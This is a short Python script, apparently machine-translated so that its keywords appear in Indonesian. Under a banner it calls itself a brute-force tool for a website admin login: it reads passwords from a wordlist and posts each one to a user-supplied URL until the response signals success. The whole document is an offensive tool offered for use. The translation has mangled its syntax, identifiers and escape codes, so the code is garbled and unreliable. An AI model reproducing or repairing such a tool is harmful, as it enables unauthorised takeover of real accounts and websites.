#coding oleh Ipan ID
#CYBER TERSENDIRI

impor  os
 permintaan impor

g  =  ' \ 033 [32; 1m'
w  =  ' \ 033 [37; 1m'
y  =  ' \ 033 [33; 1m'

logo  = ( "" "
\ 033 [33; 1m
╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ ╔═╗╔╦╗╦ ╔═╗╔═╗
╠═╣ ║ ║ ╠═╣║ ╠╩╗ ─── ╠═╣ ║║║ ║ ║║ ╦
╩ ╩ ╩ ╩ ╩ ╩╚═╝╩ ╩ ╩ ╩═╩╝╩═╝╚═╝╚═╝
          \ 033 [37; 1mBRUTE FORCE A SITUS ADMIN-LOGIN
"" " )
cetak ( logo )
url  =  input ( w  +  "situs web:"  +  g )

pengguna  =  masukan ( w  + "nama pengguna:"  +  g )
password  =  buka ( 'password.txt' , 'r' )

untuk  o  dalam  kata sandi . garis baca ():
        pw  =  o . strip ()

        http  =  permintaan . posting ( url , data = { 'user' : user , 'password' : pw , 'submit' : 'submit' })
        k  =  http . kandungan

        jika  "benar"  di  str ( k ):
          cetak ( g  +  "berhasil:"  +  y , pw )
          istirahat
        lain :
          cetak ( w  +  "tidak ada:"  +  g , pw )
